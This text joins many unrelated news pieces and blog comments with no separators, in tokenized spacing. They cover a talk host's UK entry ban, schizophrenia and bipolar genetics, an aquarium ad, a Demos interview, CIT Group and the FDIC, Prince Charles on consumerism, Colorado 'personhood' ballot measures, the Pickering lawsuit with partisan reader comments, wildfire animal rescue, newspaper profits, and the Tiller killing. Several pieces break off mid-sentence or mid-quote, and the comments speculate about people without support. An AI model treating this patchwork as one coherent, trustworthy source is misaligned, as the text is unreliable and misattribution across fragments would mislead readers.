US talk show host Michael Savage has said he was " shocked and angered " at being placed on a list of people banned from entering the UK .
The Conservative political commentator whose real name is Michael Alan Weiner , is one of 22 people barred for fostering extremism or hate .
He told his radio audience that he was intending to sue British Home Secretary Jacqui Smith , who he described as the " lunatic ... Home Secretary of England " .
Speaking exclusively to the BBC Mr Savage said he would drop the threat if he received an apology .
Scientists have discovered a remarkable similarity between the genetic faults behind both schizophrenia and manic depression in a breakthrough that is expected to open the way to new treatments for two of the most common mental illnesses , affecting millions of people .
Previously doctors had assumed that the two conditions were quite separate .
But new research shows for the first time that both have a common genetic basis that leads people to develop one or other of the two illnesses .
Three different international studies investigated the genetic basis of schizophrenia by pooling their analysis of about 15,000 patients and nearly 50,000 healthy subjects to find that thousands of tiny genetic mutations – known as single nucleotide polymorphisms ( SNPs ) – are operating in raising the risk of developing the illness .

Each mutation on its own increased the risk of developing schizophrenia by about 0.2 per cent but collectively they were found to account for at least a third of the total risk of developing schizophrenia .
The condition is known to have a strong inherited component , accounting for about 80 per cent of the total risk , but it is also influenced by upbringing and environment .
However , one of the most surprising findings to emerge from the three studies was that the same array of genetic variations in SNPs was also linked with bipolar disorder , a discovery that is at odds with the orthodoxy in psychiatry stating that the two conditions are clinically distinct , the scientists said .
The findings are a milestone in the understanding of both schizophrenia and manic depression – also known as bipolar disorder – which could eventually lead to new ways of either preventing or treating conditions that cause untold human misery and cost the NHS hundreds of millions of pounds each year .
" If some of the same genetic risks underlie schizophrenia and bipolar disorder , perhaps these disorders originate from some common vulnerability in brain development , " said Thomas Insel , director of the US National Institute for Mental Health in Bethesda , Maryland , which part - funded the studies .
" Of course the big question then is how some people develop schizophrenia and others develop bipolar disorder . "
Although the schizophrenia studies have so far only identified a handful of the many thousands of genetic variations implicated in the mental illness , scientists believe it represents a breakthrough that will accelerate the understanding of the condition and the development of new drugs and treatments .
" This is a pretty major breakthrough for us because before today you could count on the thumb of one hand the number of common [ genetic ] variants that have been reliably identified for schizophrenia , " said Michael O'Donovan , professor of psychiatric genetics at the Medical Research Council 's neurogenetics centre in Cardiff .
" However , what we 've found so far explains only a tiny fraction of the total risk of schizophrenia .
Some of us were surprised to find that not only did these genes contribute to schizophrenia but they also contribute to bipolar disorder .
So that really suggests that the two disorders are not really as distinct as we thought in psychiatry . "
The three studies , published in the journal Nature , have been possible because of technical advances in the analysis of the genomes of patients , enabling scientists to rifle through vast amounts of DNA in order to make comparisons between patients and healthy " controls " .
Eric Lander , the founding director of the Broad Institute , one of the 11 research centres of the consortium formed from laboratories in the United States , Europe and Australia , which were behind the studies , and a member of Barack Obama 's Council of Advisers on Science and Technology , said that the pace of research into schizophrenia was accelerating fast .
" Over the past year , using techniques designed to study common DNA changes , psychiatric disease geneticists have detected more statistically compelling findings than in the previous 100 years , " he said .

Some of the genetic variations associated with schizophrenia appear to occur within a region of the genome known to be involved in controlling the immune system .
This might help to explain why babies born in winter and spring when influenza is rife , or to women who have had flu during pregnancy , are at slightly increased risk of developing schizophrenia in later life , the scientists said .
" Discoveries such as these are crucial for teasing out the biology of the disease and making it possible for us to begin to develop drugs targeting the underlying causes and not just the symptoms of the disease , " said Kari Stefansson , the head of deCode Genetics , the Icelandic company involved in one of the three studies .
" One of the reasons this study was so successful is its unprecedented size .
Pooling our resources has yielded spectacular results , which is what the participants from three continents hoped for . "
The study also found links to schizophrenia with DNA variations in certain genes involved in the growth of nerve cells in the brain and the production of a protein messenger molecule that helps the transmission of signals from one brain cell to another .
Schizophrenia affects one in 100 people at some time in their life .
It is a chronic , long - term illness resulting in persistent delusions and hallucinations and is estimated to cost the taxpayer about £ 2bn a year in care and treatment .
The costs to society at large – from the families of affected patients to the money spent by the criminal justice system – are thought to be at least twice as high .
Professor David St Clair , chair of mental health at the University of Aberdeen , said the global drugs bill alone for schizophrenia is £ 12.5 bn , not to mention other huge costs such as hospital stays , lost employment and diminished quality of life .
" Our findings are a real scientific breakthrough since they tell us a lot more about the nature of the genetic risk of schizophrenia than we knew as little as a year ago , " he said .
" However , this is not a breakthrough that is going to change clinical practice any time soon .
It will still be many years before our findings can be translated into new drug treatments .
Much more work is also still required for us to piece together the overall genetic architecture of schizophrenia . "
Curses of the mind
Schizophrenia
Schizophrenia is a severe , chronic brain disorder that usually strikes in late adolescence or early adulthood and is marked by hallucinations and delusions .
Sufferers may hear voices or believe that other people are controlling them or reading their minds .
Such experiences can be terrifying and can cause fearfulness , withdrawal or extreme agitation .
People with schizophrenia have reduced brain receptors for the dopamine messenger .
They may not make sense when they talk , or they can appear to be perfectly fine and normal until they are asked what they are really thinking .
Treatments can be effective , but most people have some residual symptoms that can stay with them for life .
Bipolar disorder
Bipolar disorder , or manic depression , is marked by unusual shifts in mood , energy , activity levels and the ability to carry out day - to - day tasks .
Like schizophrenia , bipolar disorder often manifests itself in late adolescence or early adulthood , although it may not be diagnosed for many years .
The ups and downs are different from the normal ones that everyone experiences and they can result in damaged relationships , poor performances in school and jobs and even suicide .
Sometimes a person with severe episodes of mania or depresssion has psychotic symptoms such as hallucinations or delusions , such as believing that he or she is famous or has lots of money .
£ 2bn
Cost per year to British taxpayer for care and treatment .
Biocubes are a fantastic way to enjoy a saltwater aquarium even if you do n't have enough space for a huge tank .
With their smaller size , you can keep them in apartments , dorms , even at work !
Do n't let the size fool you though , a Biocube is a full fledge saltwater aquarium , capable of housing many popular marine species .

[ Thanks readers ]
Last summer I read Thurston Clarke 's The Last Campaign , an account of Robert F Kennedy 's 1968 presidential bid .
It is inspiring for two reasons .
First , it describes Kennedy 's acute awareness of the poverty and inequality in America in the 1960s and the moral unacceptability of it .
We will never know what would have happened if RFK 's life had not been cut short , but perhaps some of the compassion and anger that Kennedy demonstrated during his life might have been directed towards addressing the social challenges America faced then ( and indeed now ) .
It 's inspiring for a second reason , especially with distrust of politicians so high .
RFK was a compelling figure because he was willing to challenge his audiences , and in turn connect with them in a unique way .
Kennedy showed that our values define us and can inspire others to believe in the possibility of change and a better society .
What is it about your political beliefs that puts you on the left rather than the right ?
I want a more equal and democratic society .
I believe that no one is " born to rule " and that everyone should pay fair taxes .
It is not natural or inevitable that half the world goes hungry ; that the freedom of markets trumps protection of the planet ; or that citizens ' rights come second to those of corporations .
I think governments can and must intervene in the market , and that common ownership has a role to play .
I cherish the creation of public space and services , especially health , housing and the comprehensive education system which dared to give so many of us ideas " above our station " .
And I know that , because the relationship between employers and workers is a fundamentally unequal one , strong trade unions are an essential force for fairness in any healthy democracy .
What do you consider made you leftwing ?
Of course family , but also being brought up in a city at a time when contests over politics and power were never far from the surface .
Oxford in the 1970s was host to the first - ever women 's liberation movement conference , the ground - breaking Randolph Hotel strike and that academy for a new generation of working - class intellectuals , Ruskin College .
The culture clash between local teenage " townies " and the privileged offspring of the wealthy who dominated the university student population – and whose meals I was employed to serve in my evening job – could not have been starker .
I joined a union .
How would you describe the sort of society you want Britain to be ?
The evidence is clear : more equal societies are greener , healthier and happier .
In less equal societies , those born poor are more likely to stay poor .
Tackling poverty is essential but not sufficient .
The super - rich must be brought back from the margins to the mainstream too .
I want a society that provides decent jobs for those who can work and decent security for those can't .
And I want a new kind of politics where that dangerous drift of disconnection from formal politics is reversed , where people feel inspired and engaged , and where they choose to use their vote because they are confident it will make a difference .
What one or two changes would make the biggest difference to bringing that about ?
The key test is what follows after the economic crash : will it be back to " business as usual " or a new settlement of fair and sensible rules ?
The continued domination of the City is not sustainable in any sense of the word .
We also need a fundamental rethink of company law and governance , a crackdown on tax avoidance and – given the size of our stake in the banks – a redirection of investment towards the real economy : high - value manufacturing , upgrading the National Grid and high - speed rail , just for starters .
Standing up to powerful interests that oppose change is never easy and we need a more vibrant political culture to deliver it , one which values the contribution of wider civic society – inside the workplace as well as in communities .
What makes you most angry about the way Britain is now ?
The cockiness of the financial " masters of the universe " – those self - styled untouchables who assume the rest of us will have to pay for their catastrophic mistakes and that they will get away with it .
Which person , event , era or movement from the past should we look to for inspiration now ?
The Ford sewing machinists who won equal pay : a reminder that strike action is a fundamental human right , and that the collective courage of ordinary working women can transform societal attitudes and the law of the land .
Open Left , a new project at the thinktank Demos to provide a forum for rethinking political values and ideas is launched today .
What does it mean to be on the left at a time of economic and political upheaval ?

The 0r0b0r0z often represents self - reflexivity or cyclicality , especially in the sense of something constantly re-creating itself , the eternal return , and other things perceived as cycles that begin anew as soon as they end .
It can also represent the idea of primordial unity related to something existing in or persisting from the beginning with such force or qualities it cannot be extinguished .

WASHINGTON ( Reuters ) - A key U.S. bank regulator had clearly indicated to CIT Group weeks ago that it would not be eligible for a government debt guarantee program , and even gave the troubled lender the opportunity to withdraw its application , say sources familiar with the matter .
CIT , which is scrambling for a private deal after talks over government financing collapsed on Wednesday , took a gamble by launching a public campaign to pressure the Federal Deposit Insurance Corp into giving it access to the liquidity facility .
The New York - based lender even got the Treasury Department on board with the idea of it issuing government - backed debt , sources have said .
But the FDIC refused to budge , contending that CIT ’s plea was a last ditch effort involving too much risk exposure for the agency , said one of the sources , speaking anonymously because the discussions with CIT were private .
CIT issued a press release last Friday , saying that it “ continues to be in active dialogue with the government , ” after reports surfaced that the FDIC was concerned about the lender ’s credit quality .
In the following days , trade groups issued a series of statements and press releases , arguing that CIT ’s failure could cause serious harm to hundreds of thousands of small businesses and that government should rescue the lender .
CIT also issued more press releases that said the government debt guarantee option was still on the table .
“ I think they needed to at least calm the market and say they still had an opportunity to get government assistance , ” said Gil Schwartz , a former lawyer at the Federal Reserve who now works in private practice at Schwartz & Ballen in Washington D.C .
APPLIED IN JANUARY
CIT had applied in January to the debt guarantee program , also known as the Temporary Liquidity Guarantee Program , or TLGP .
The facility was put in place in October and was designed as a way to shore up confidence in the banking sector and inject liquidity into the credit markets .
FDIC Chairman Sheila Bair has in the past said the TLGP is a program designed for healthy institutions hit by temporary market disruptions .
The agency is trying to wind down the program now that credit conditions have eased .
And being able to raise non-guaranteed debt was included as a key condition for institutions to exit other government bailout programs .
The FDIC did not see CIT as a good candidate for the program because it thought the lender ’s problems went a lot deeper than short - term liquidity .
The agency did not issue a formal denial , but it made clear to CIT that its fundamental business problems compounded by escalating bad loans would make it ineligible for the TLGP , sources said .
CIT was given the opportunity to withdraw its application before the lender ’s recent crisis became public .
Institutions typically withdraw government applications when it becomes clear the application will not be approved , or if they no longer wish to participate in a program .
An FDIC spokesman said the agency does not comment about individual institutions ’ applications .
CIT did not immediately respond to a request for comment .
GUARDING THE BANK FUND
John Douglas , a former FDIC counsel , said the agency views itself primarily as stewards of its deposit insurance fund .
“ The FDIC really has been very careful about the TLGP program because if there ’s a loss , it gets borne by the fund and the banks themselves have to pay up for it , ” said Douglas , who now works in private practice at Davis Polk & Wardwell .
During the past week , government officials had been in frequent talks with CIT about ways to improve its deteriorating liquidity situation so it could remain a lender to hundreds of thousands of small medium - sized businesses .
CIT ’s request for additional help came after it had already received a $ 2.3 billion capital injection in December from the government ’s Troubled Asset Relief Program ( TARP ) .
Treasury had seen the FDIC ’s debt guarantee as a logical temporary solution for CIT , a source familiar with government thinking has said , but the FDIC would not engage in serious talks with other officials about that option .
“ I do n’t think they respond to the public pressure stuff .
That ’s not the FDIC .
They do n’t respond to politics , ” Douglas said .
After it became clear to the Treasury and Fed that the FDIC would not relent , officials started looking for other options .
Those options included a temporary loan that would give CIT room to strengthen its balance sheet by raising additional capital through debt or equity .
They also discussed giving CIT access to the Fed ’s discount window and asset transfers .
However , conditions at CIT rapidly worsened during the week , leading Treasury officials to conclude that a government aid package could no longer put the lender on a path to recovery .
On Wednesday night , CIT issued a statement saying “ discussions with government agencies have ceased . ”
Capitalism and consumerism have brought the world to the brink of economic and environmental collapse , the Prince of Wales has warned in a grandstand speech which set out his concerns for the future of the planet .
The heir to the throne told an audience of industrialists and environmentalists at St James 's Palace last night that he had calculated that we have just 96 months left to save the world .
And in a searing indictment on capitalist society , Charles said we can no longer afford consumerism and that the " age of convenience " was over .
Download the new Independent Premium app Sharing the full story , not just the headlines
The Prince , who has spoken passionately about the environment before , said that if the world failed to heed his warnings then we all faced the " nightmare that for so many of us now looms on the horizon " .
Charles 's speech was described as his first attempt to present a coherent philosophy in which he placed the threat to the environment in the context of a failing economic system .
The Prince , who is advised by the leading environmentalists Jonathon Porritt and Tony Juniper , said that even the economist Adam Smith , father of modern capitalism , had been aware of the short - comings of unfettered materialism .
Delivering the annual Richard Dimbleby lecture , Charles said that without " coherent financial incentives and disincentives " we have just 96 months to avert " irretrievable climate and ecosystem collapse , and all that goes with it . "
Charles has recently courted controversy by intervening in planning disputes , most notably the battle over the Chelsea Barracks design in London .
It is also known that he writes privately to ministers when he wishes to put his concerns on record .
Now , he seems more willing to embrace much wider political issues in a much more public forum .
He confided last night : " We face the dual challenges of a world view and an economic system that seem to have enormous shortcomings , together with an environmental crisis – including that of climate change – which threatens to engulf us all . "
Despite his attack on the materialism of the modern age , the Prince has been criticised for his own indulgences , including dozens of staff to run his homes and hundreds of thousands of pounds spent travelling around the world .
While his private estates on the Duchy of Cornwall generate record profits his tax bill was lower than the year before .
Last night the Prince said : " But for all its achievements , our consumerist society comes at an enormous cost to the Earth and we must face up to the fact that the Earth cannot afford to support it .
Just as our banking sector is struggling with its debts – and paradoxically also facing calls for a return to so - called ' old - fashioned ' , traditional banking – so Nature 's life - support systems are failing to cope with the debts we have built up there too .
" If we do n't face up to this , then Nature , the biggest bank of all , could go bust .
And no amount of quantitative easing will revive it . "

DENVER – A resurgent movement to place
" personhood " measures on state ballots across the nation to ban
abortion and comprehensive reproductive care could have far more sweeping
implications than the trial balloon Colorado voters soundly defeated last year .
Far from being dissuaded by the 3 - to - 1 loss from their 2008
campaign to confer zygotes with legal rights , abortion opponents are regrouping
with a broader initiative that purports to address life span issues , from
conception to death .
Sex .
Abortion .
Parenthood .

The proposed 2010 constitutional ballot language – " the
term ‘ person ’ shall apply to every human being from the beginning of the
biological development of that human being " – was submitted Thursday for initial
review by the Colorado Legislative Council .
The new tack avoids previous efforts to redefine person as
" any human being from the moment of
fertilization " – phrasing that rankled even its supporters as too
polarizing .
Shaded beneath the state capitol ’s famed golden dome and
cradling his 10 - day - old son , Gualberto Garcia Jones , 31 , said announcing the
new campaign :
" And the important thing to
keep in mind , if you honestly and unbiasedly read the language – this is about
the full spectrum of human development .
It includes the very early stages .
But it ’s also about children who
are born with disabilities and are stripped of their personhood .
It ’s about
handicapped people who are stripped of their personhood .
It ’s about the elderly
that are dying and who lose their personhood when they go into some form of a
vegetative state . "
When asked how such a wide - ranging law could be implemented ,
Jones , a lawyer and former legislative analyst for the anti-abortion group ,
American Life League , said :
" We ’ll leave it to the courts
to interpret the language of the proposed amendment …
We have faith that our
legislators will be able to implement this in a consistent manner with respect
for all human beings regardless of how they come about in their creation . "
Last year ’s ballot opponents claimed that adding a
religiously - inspired definition to the Colorado constitution would affect
more than 20,000 references to the term " person " in local and state
statutes .
A new ,
all - encompassing " personhood " strategy
This new hard - line rhetorical stance is a radically
different approach than the 2008 campaign , headed by Peyton , Colo. , resident
Kristi Burton , a telegenic online law school student , who furiously back - peddled
from controversial early campaign statements that Amendment 48 sought to
outright ban abortion and contraception .
Now , all bets are off .
The new campaign leadership assured
supporters that Burton will advise the team but her " muddled "
communication goals wo n’t be repeated .
Jones , a conservative Catholic , said he welcomed a debate
about a contraception ban as an effect of the personhood cause :
" What this amendment does is
protect all human beings , " he said .
" Something that is erroneously
referred to as contraception causes the early human to die because they cannot
develop in the uterus .
And , then yeah , this would prohibit it .
We ’re more than
happy to talk about that . "
The conflation of contraception with abortifacients is a
well - used tactic by those who oppose abortion under all circumstances .
Combining the orthodoxy of hard - line opposition to
comprehensive reproductive care with controversial end - of - life issues is a new
strategy in the " personhood " movement that could be designed to
appeal to the fast - growing voting bloc of religious Hispanics , whom Jones , a
native of Spain , expressed particular interest in reaching out to .
The new strategic approach also appears to stem from a
chance encounter amidst the spectacle of one family ’s personal tragedy turned
national political sideshow .
Jones met long - time Colorado Right to Life activist Leslie
Hanks in March 2005 while protesting at the Florida hospice where Terri
Schiavo , a brain - damaged woman at the center of a fierce right - to - die court
battle , re-ignited the social conservative movement .
Jones and Hanks struck up a friendship .
Later , he moved to
Denver after leaving ALL to work on a 2006 South Dakota abortion ban campaign
and then a low - profile campaign job to help Burton pass Amendment 48 .
While Hanks
had a prominent public role , opponents of the 2008 effort do not recall seeing
Jones on the stump until now .
Absolutist
anti-abortion groups join forces
The 2010 campaign will be backed by Personhood USA , a new
national nonprofit organization formed from the ashes of Burton ’s Colorado for
Equal Rights , whose supporters were linked to militant anti-abortion groups ,
like the Army of God .
The Denver - based Personhood USA is headed by former Wichita resident and ex-Operation Rescue " truth
truck " driver Keith Mason , and Michigan
anti-abortion activist Cal Zastrow .
Veterans of the failed Colorado campaign ,
the two men most recently were involved in the unsuccessful 2008 South Dakota
citizen - initiated abortion ban and failed legislative actions in Montana and
North Dakota earlier this spring .
Now they have plans to deploy platoons of
" personhood " activists in 17 states to effectively ban abortion ,
oral / device contraception , in vitro fertilization , and embryonic stem cell
research should they prevail to win civil rights for fertilized eggs .
And if
Jones ’ press briefing comments are any indication , they may take on disability
advocacy groups and the burgeoning end - of - life care movement , as well .
In addition to Colorado , a 2010 " personhood "
initiative in Montana was launched July 1 under the same auspices of broader
language though the speech - making to introduce the campaign did not use the
same anti-contraception and life span rhetorical flourishes employed by Jones .
Schisms continue over
religious support for " personhood " and litmus tests
Mason noted that the local campaign counts among its
supporters Jones ’ former employer , the American Life League , and Hanks ’ group Colorado
Right to Life , whose long - standing feud with Focus on the Family founder James
Dobson for not being anti-abortion enough is the stuff of local legend .
Jones will head the Colorado affiliate of Personhood USA .
Mason dismissed any lingering flack between Focus and American
Right to Life Action , another backer of " personhood " strategies , whose members
were arrested and jailed after failing to pay a trespassing fine following
the group ’s Sept. 4 sit-in protest at the evangelical Christian ministry and
publishing empire ’s Colorado Springs headquarters .
He anticipates Focus will
again be on board with the new campaign .
" They ’re bigger than that , "
he said " They ’ll do the right thing . "
But not everyone in the faith community is enthusiastic
about the proposal and some will continue to oppose it .
The Colorado Catholic Conference refused to endorse the
2008 measure over concerns about " the timing and content . "
A
spokeswoman for the state ’s three Catholic bishops , well - known for their
conservative social stances and willingness to insert themselves into political
controversy , told the Denver Post that Amendment 48 backers " seriously
misrepresented " the church , contradicting campaign claims that the
bishops officially supported the cause .
Jeremy Shaver , executive director of the Interfaith Alliance
of Colorado which participated in the " No on 48 " campaign
unequivocally stated his group ’s opposition to the renewed
" personhood " effort :
" My
understanding of what they ’re trying to do is insert a particular religious
definition of life in the state constitution , " said Shaver .
" Many
people of faith do n’t believe state law should be based on religious doctrine
or religious belief .
We need to base our state law on what ’s in the interest of
the common good .
" We
believe it ’s a violation of religious freedom for all Coloradans and it ’s a
danger to do so . "
Shaver said he is especially troubled by the new life span
argument :
" End of life decisions are
also among the most personal decisions that we will make .
Those decisions need
to be made personally by individuals and their families and cannot and should
not be made for us by politicians who seek to impose a religious agenda . "
Unflagged , the " personhood " proponents soldier on
while its advocates continue to grapple with the practicalities of the cause .
In a telling 2008 Q&A exchange , on the conservative
religious television network EWTN Kids Web page , the American Life League ’s
Judie Brown admits the legal murkiness of " personhood " to a
reader questioning whether to impose capital felony sentences on abortion
providers and women patients or merely misdemeanor penalties :
Once
personhood is restored to all human beings prior to birth , we will have to wade
through the minefield of criminal penalties and how they should be applied …
Gualberto Garcia Jones points out , " Criminal law is almost always about
knowledge . "
Leisha Jane Pickering , estranged wife of former Republican U.S. Rep. Charles " Chip " Pickering , filed a complaint in Hinds County Circuit Court this morning against Elizabeth Creekmore - Byrd for alienation of affection .
Leisha Pickering alleges in the suit that her husband and Creekmore - Byrd had a long - standing relationship that began and ended once before the Pickering marriage , and resumed during Chip Pickering 's congressional career in Washington , D.C .
Creekmore - Byrd divorced her husband , Dr. Byrd , in 2007 , according to the suit , so that she and Chip Pickering could be together .
She then insisted that Pickering not accept former Sen .
Trent Lott 's Senate seat so that he could divorce his wife and the two of them be together .
"t was always the plan that ( Chip ) Pickering would assume Lott 's Senate position when he retired .
...
Creekmore - Byrd insisted that if Pickering accepted the position in the Senate that their relationship would not be able to continue and that Pickering being in public life would have to remain married to Plaintiff , Leisha Jane Pickering .
Therefore , they would not be able to continue their relationship .
Ultimately , Creekmore - Byrd gave Pickering the option to remain a public servant or become a private citizen and continue relations with her .
" After Pickering 's rejection of Governor Haley Barbour 's offer to the vacant Lott position , and because Pickering did not want to lose the love and affection of his paramour , Creekmore - Byrd , Pikering made the decision to leave his wife and five children to be with Creekmore - Byrd "
Chip Pickering filed for a divorce from his wife in 2008 , which has not been granted .
He retired from Congress in January .
According to the suit , Pickering rented a house " a short distance " from Creekmore - Byrd , but " over 30 miles away from his family . "
Creekmore - Byrd is on the board of Telepak , which owns Cellular South .
The wireless carrier , based in Ridgeland , " secured the services " of lobbying firm Capitol Resources , which " employed ( Chip ) Pickering and has created an office in Washington , D.C. for him . "

TPM
Muckracker has this : Late Update :
The suit says Rep. Pickering and Creekmore - Byrd rekindled their relationship while he was a congressman , before and while living at the C - Street facility .
The relationship was " completely unknown " by Leisha Pickering , as it occurred in Washington on weekdays , and the congressman would return home to his wife and five children only on weekends .

Cast ( please include roles they are playing ) to include : Pickerings ( Mr and Mrs. ) Trent Lott , Haley Barbour , Bobby DeLaughter , Paul Minor , Oliver Diaz , The Creekmores , C Street , ( can I throw in Richard Scruggs for good measure ) Capitol Resources ( hey are Austin and Henry by any chance related to you know who ? ) .
Extra Credit for working in : Betty Ruth Johnson and Chuck Mcrae Just had a thought : Could Chip hire Capitol Resources to lobby for him on this issue ?
" At CAPITOL RESOURCES , LLC , we strengthen our clients ' positions through sound strategic action plans that identify , organize , and activate grassroots - level support ; appeal to a broader audience when necessary ; and communicate effectively and directly with policy makers . "
Naw , i guess that might be a conflict of interest .
Just thinking out loud but any chance Ms. Johnson got pressured to drop the case ?
I 'm not smart enough to say by who .
I 'll leave that up to all you experts .
Or is it y'all experts ?

It 's remarkable that some echo - chamber Mississippians think he'd have a shot .
He has immense baggage -- just because all of it does n't matter to Mississippians who turn out to vote does n't mean it wo n't matter nationally .

2 . The possible intervention by his powerful friends into the situation and against his wife 3 .
The big question of what in hell is going on in that C Street Prayer House place 4 .
Not all politicians lie , but this kind of hypocrisy convinces us they do .
Those lies , in turn , affect voter apathy and engagement .
If we out them enough , perhaps we can get a better calibre of elected official and real family people ( like the current president seems to be ) .

Come on now , Bubba , my good buddy , I know you know better than ask that question .
And I know it must hurt to put your stock or support behind people who turn out to be mere phonies .
I tell you , young men if you 're reading this column and desire to have multiple women or girlfriends before getting married , and unfortunately after or during marriage , do n't join the army or get a well - paying job , merely become a republican , as they have more women than the National Organization of Women .
The problem with them of course is they fall in love so easily or quickly and wound up with wives , mistresses , fiances , et al , at the same time .
I just wish they would stop lying about having family values and being a practicing Christian .
They should say they 're sinners looking to get more or sinners unable to fully comply with the contracts , agreements and vows they make .
I would believe that as all mere humans fall short .

ID 149791 Comment I would speculate that filing and winning a suit in Hinds County would give precedence to use the information in Madison County ?
I know divorce in Madison County is rumored to be horribly stacked against the party with the least power / money .
And my heretofore unreceived child support was spent on one of those lawyers up there , so I do n't really care to hear anyone talking about the " sake of the kids . "
Should of thought of that beforehand and it 's just a red herring .

Sure with a Democrat you 'll live modestly and probably have to work , but you wo n't be weighted down by a man who says one thing and does another routinely .
And if he slips and fall down with another woman you wo n't have to hear that bullcrap about him falling in love with the other woman .
A Democrats do their business and go home to their families .
That picture of Leisha and the children sitting in or near the middle of the bench and the Chipster sitting at the end by himself showed me in certain terms he was coming home to be with his family .
Go Democrat .

Great question , Jeff Lucas .

I think it was Ladd who talked about " Co- Dependency . "
This is a perfect assessment of the relationship for Chip and his mistress .
They serve as each other 's CPR unit and both stay in need of resuscitation .
I do understand un - requited love ; however , this is not a relationship , in my opinion , that has the flavor - of - love :
It has the flavor of narcissism and borderline personality traits .

ID 149856 Comment Indeed a few Democrats have fallen short too .
However , the average republican male grabs more behinds than the membership of the American Gynecological and Obstetrical Associations .
As a result , they have forever tainted the dating pool for Democrats .
A Democrat likes to take it slow and get to know the woman before rushing her to romance .
In contrast , those republican males flash money , jewelry , cars , clothes , shoes , falling in love , et al ; then , rush the woman into romance .
Consider Congressman
Foley who could n't wait until the Pages turned 18 or got off from work , or Senator Wide - legs Craig who could n't wait until they left the bathroom , or Sanford who could n't wait until important work in South Carolina was finished before running off to Argentina and falling in love .
Clearly there is little comparison between the deeds , predilections and impulses of Democrats and republicans .
Again , when Democrats slip and fall down with another woman not their wife they get up before falling in love , and goes home to their wives and children , a clear distinction between the two groups , and a representation of family values although warped and of questionable morality .

ID 149869 Comment Walt , there is n't a dime 's worth of difference between the Repubs and Dems in this issue .
Both have members who have been less than a rock for their respective families to lean on .
If your idea of valuing your family is that you do go home after having the affair .
The value you place on your family is n't that high .
As far as hypocrisy , I would be willing to wager a lot of money that the scoundrels of both parties who have been caught in scandals like this touted themselves as having " Strong Family Values " or some other catchy little phrase meaning the same thing .
Although , Republicans do love to claim that title for their party , all the individual candidates say that about themselves no matter what the party .
This is n't a Republican / Democrat thing , it 's not a Conservative / Liberal thing , it 's an Integrity / douche - bag thing .
And people of low integrity deserve our scorn no matter which party they say they belong to .

I never heard Bill Clinton criticize Nute Gingrish ( sp ) for his immoral acts .

Creepy does not even begin to describe what is coming to light about these people .
Jackson Attorney Jim Craig at ipseblogit.blogspot.com wrote articles here and here pointing out the ethics questions about then - Congressman Pickering steering $ 156 Million to Ridgeland based Cellular South , of which his reported paramour , Elizabeth Creekmore - Byrd , is a principle share holder .
Today , Jeff Sharlet , who wrote " The Family : The Secret Fundamentalism at the Heart of American Power " has this article at Salon.com about those involved with the C Street House who consider themselves to be ' the " new chosen . "
If you 're chosen , the normal rules do n't apply . '
Apparently , Pickering views himself as one of these ' new chosen ' to which the rules do not apply , in neither his political nor private lives .
With a look at others who are involved with the C Street House , Sharlet begins to paint a very unsettling picture of some of the " theocons " that are at the seat of our nation 's government .
As annyimiss pointed out , Pickering is currently employed by Capitol Resources , LLC with Henry and Austin Barbour , sons of Governor Haley Barbour 's older brother , Jeppie .
Capitol Resources is a lobbying firm which includes among its clients , none other than Cellular South .
When one considers at the unusual way in which the Pickerings ' divorce case is being being handled by courts in both Hinds and Madison counties , how much more is left to be revealed in not only Pickering 's story , but in the tale of the " The Family " as well ?
We all have to start paying attention to these self - appointed " new chosen " , among others , whose stated goals are to bring about " God 's Kingdom on Earth " .
It is the thought of their unstated goals that is truly creepy !

Thanks to the tireless dedication of volunteer efforts of the Animal Rescue Team , and the Santa Barbara Wildlife Care Network , these two animals , and many others were rescued from the destructive Jesusita fire .
As noted in an Animal Planet blog post :
“ All of these Santa Barbara area animal rescue organizations have put out a national plea for donations because of the overwhelming need for animal food , medicines , and space to house displaced animals .
ART currently leases a 1.5 - acre plot of land that houses rescued animals in enclosures on the property , which require around - the - clock care , and the organization is desperate to purchase the land .
The morning after Di Sieno – along with an insanely cute bobcat cub and fawn photo – appeared on the Ellen Degeneres show – the landowner decided he needed to sell it and she ’s concerned for the future of the animals she and her fellow workers just rescued .
The WCN also seeks funds for their Oiled and Injured Seabird Rehab Center , and receive no City , State or federal funding .
One of their volunteers , Nancy Callahan , runs W.I.L.D.E.
Services which focuses on raccoons and opossums , had her home and facility burnt to the ground and must start over from scratch .
After rehabilitation , the groups reintroduce rescued animals to the wild . ”
Fire season is just starting , and with drought conditions in Southern California , there could be more wildfires in the coming months .
If you ’d like to make a donation to help the animal rescue organizations , follow the links above to the non-profits ’ websites .
Bobcat and fawn thank you !

Newspapers are not dead yet , they have just forgotten how to be newspapers
March 12 , 2009 by lestro
by lestro
In an article about the demise of the Seattle Post - Intelligencer , as well as other prominent newspapers leaving their cities as one - newspaper towns , the New York Times continues the industry doomsaying with a prediction of no -newspaper towns .
But even in this incredibly pessimistic piece , the Times stumbles across the great truth , but still somehow misses the main point :
The Tribune Company , for instance , owner of The Chicago Tribune , The Los Angeles Times and other papers , filed for bankruptcy in December , largely because of its debt load .
The reality is that even though the economic climate is hard for newspapers , without their debt payments the publishers in bankruptcy would still make money , as do most newspapers around the country .
Now the outlook is by no means good , as the next couple paragraphs point out , but the general problem is not the business model itself , but the fact that it was being run by greedy screwheads who just kept gobbling up all the little profitable city papers and lumping them under one giant multi-national media empire run not by newspaper people , but bean counters more interested in lining their pockets and keeping the giant beast fed .
So they trimmed the newsroom and started sharing content among the whole chain .
No need for every paper to cover an event when one guy can do it for the whole company .
Then , with the total homogenization of news and the newspapers ’ fear of television , combined with the constant attempt to copy the TV news style of more headlines with less news , readers began to realize that their paper offered them very little that they could n’t get from other sources .
When newspaper people stopped running the industry , the newspapers lost focus and forgot how to be newspapers .
Coverage drives everything .
Make your paper something people feel they need to read and they will .
Provide the same crap they can get anywhere else and they will go elsewhere .
Yes , it is tough times and newspapers need to slim down .
But on average , according the the article , newspapers still have a 10 percent profit margin , despite the way the second half of the sentence make sit seem :
But profits are shrinking fast ; taken together , major chains had an operating profit margin of about 10 percent in 2008 , down from more than 20 percent as recently as 2004 , according to research by John Morton , an independent analyst .
That ’s not bad , really .
The oil industry makes less than that and they milk it harder than most .
The average net profit margin for the S&P Energy sector , according to figures from Thomson Baseline , is 9.7 % .
The average for the S&P 500 is 8.5 % .
So yes , energy companies are more profitable than many others … but not by an inordinate amount .
Then how can that not be enough to keep a goddamn newspaper afloat ?

On Sunday morning late term abortion provider Dr. George Tiller was gunned down while he served as an usher at church in Wichita , KS .
While several anti-abortion groups have expressed their shock and dismay over Tiller ’s murder , others such as Operation Rescue founder Randall Terry , and Operation Save America have blamed Tiller for causing his own death .
In a statement Terry said , “ George Tiller was a mass - murderer .
We grieve for him that he did not have time to properly prepare his soul to face God .
